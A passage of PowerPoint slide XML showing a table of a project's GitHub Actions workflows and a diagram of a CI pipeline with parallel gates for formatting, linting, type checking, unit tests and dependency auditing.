                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Meiryo UI"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>security.yml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50" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>PR, push, weekly</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50" b="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CodeQL, zizmor</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3"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="534924">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Meiryo UI"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>oss-compliance.yml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50" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Deps change, daily</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50" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>License + CVE policy, CSV report</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4"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="534924">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Meiryo UI"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>ts-deploy.yml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50" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Version bump, manual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50" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CI, then GitHub Release</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5"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="534924">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Meiryo UI"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>java-deploy.yml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50" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Version bump, manual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50" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CI, then GitHub Release</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6"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="534924">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Meiryo UI"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>dependabot.yml</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50" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Weekly</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50" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Update PRs: npm, Maven, Actions</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="125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CI pipeline</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: six gates </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>in parallel</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Each gate is its own job, so a failing PR tells you exactly what broke</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Trigger"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3069082"/>
            <a:ext cx="1828800" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="282828"/>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5" name="Icon 5" descr="GitBranch"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="3251962"/>
            <a:ext cx="384048" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="3178810"/>
            <a:ext cx="1188720" cy="50292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rgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Pull request</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="3709162"/>
            <a:ext cx="1600200" cy="4572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200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D0D0D0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>or push to main</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="8" name="Connector 8"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2377440" y="3663442"/>
            <a:ext cx="320040" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="9" name="Connector 9"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2697480" y="1879600"/>
            <a:ext cx="0" cy="3568700"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="10" name="Connector 10"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2697480" y="1879600"/>
            <a:ext cx="292608" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Job Format check"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3017520" y="1582420"/>
            <a:ext cx="3154680" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12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2" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3126740" y="1651000"/>
            <a:ext cx="457200" cy="457200"/>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3" name="Icon 13" descr="Paintbrush"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3237230" y="1760855"/>
            <a:ext cx="237744" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3703320" y="1614170"/>
            <a:ext cx="2377440" cy="310896"/>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Format check</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3703320" y="1906270"/>
            <a:ext cx="2377440" cy="25603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5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Prettier · Spotless</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="16" name="Connector 16"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6200140" y="1879600"/>
            <a:ext cx="246888" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="17" name="Connector 17"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2697480" y="2593340"/>
            <a:ext cx="292608" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Job Lint"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3017520" y="2296160"/>
            <a:ext cx="3154680" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12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9" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3126740" y="2364740"/>
            <a:ext cx="457200" cy="457200"/>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0" name="Icon 20" descr="Search"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3237230" y="2474595"/>
            <a:ext cx="237744" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3703320" y="2327910"/>
            <a:ext cx="2377440" cy="310896"/>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Lint</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3703320" y="2620010"/>
            <a:ext cx="2377440" cy="25603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5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ESLint · Checkstyle + SpotBugs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="23" name="Connector 23"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6200140" y="2593340"/>
            <a:ext cx="246888" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="24" name="Connector 24"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2697480" y="3307080"/>
            <a:ext cx="292608" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Job Typecheck"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3017520" y="3009900"/>
            <a:ext cx="3154680" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12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6" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3126740" y="3078480"/>
            <a:ext cx="457200" cy="457200"/>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7" name="Icon 27" descr="Braces"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3237230" y="3188335"/>
            <a:ext cx="237744" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3703320" y="3041650"/>
            <a:ext cx="2377440" cy="310896"/>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Typecheck</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3703320" y="3333750"/>
            <a:ext cx="2377440" cy="25603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5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>tsc · javac -Werror</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="30" name="Connector 30"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6200140" y="3307080"/>
            <a:ext cx="246888" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="31" name="Connector 31"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2697480" y="4020820"/>
            <a:ext cx="292608" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Job Unit test"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3017520" y="3723640"/>
            <a:ext cx="3154680" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12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33" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3126740" y="3792220"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">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34" name="Icon 34" descr="FlaskConical"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3237230" y="3902075"/>
            <a:ext cx="237744" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Text 35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3703320" y="3755390"/>
            <a:ext cx="2377440" cy="310896"/>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Unit test</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Text 36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3703320" y="4047490"/>
            <a:ext cx="2377440" cy="25603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5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Vitest · JUnit + JaCoCo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="37" name="Connector 37"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6200140" y="4020820"/>
            <a:ext cx="246888" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="38" name="Connector 38"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2697480" y="5448300"/>
            <a:ext cx="292608" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Job Dependency audit"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3017520" y="5151120"/>
            <a:ext cx="3154680" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12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40" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3126740" y="5219700"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F06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41" name="Icon 41" descr="Bug"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId8"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3237230" y="5329555"/>
            <a:ext cx="237744" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Text 42"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3703320" y="5182870"/>
            <a:ext cx="2377440" cy="310896"/>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Dependency audit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Text 43"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3703320" y="5474970"/>
            <a:ext cx="2377440" cy="25603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5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pnpm audit · OSV-Scanner</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="44" name="Connector 44"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6200140" y="5448300"/>
            <a:ext cx="246888" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="45" name="Connector 45"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6446520" y="1879600"/>
            <a:ext cx="0" cy="3568700"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="46" name="Connector 46"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6446520" y="3663442"/>
            <a:ext cx="246888" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="Build"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="3206242"/>
            <a:ext cx="1691640" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12000"/>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48" name="Text 48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="3251962"/>
            <a:ext cx="1691640" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Build</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="Text 49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="3663442"/>
            <a:ext cx="1691640" cy="3657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150" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E8E0F7"/>
                </a:solidFill>
              </a:rPr>
              <a:t>needs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0">
                <a:solidFill>
